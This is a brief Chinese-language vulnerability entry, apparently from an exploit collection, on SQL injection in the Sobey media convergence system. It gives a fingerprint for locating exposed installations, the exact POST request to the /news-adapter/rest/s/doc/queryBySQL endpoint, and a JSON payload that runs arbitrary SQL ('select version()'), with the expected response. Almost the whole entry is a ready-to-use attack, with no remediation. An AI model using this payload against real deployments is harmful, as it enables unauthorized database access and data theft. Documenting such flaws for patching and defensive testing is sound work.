# 索贝融媒体系统queryBySQL存在SQL注入漏洞

索贝融媒体系统 ｜ SQL注入 ｜ —
- **指纹**：`app="SOBEY-融媒体"`
- **请求**：`POST /news-adapter/rest/s/doc/queryBySQL HTTP/1.1`

**Payload**
```
{ "SQL": "select version()" }
```
- **响应特征**：200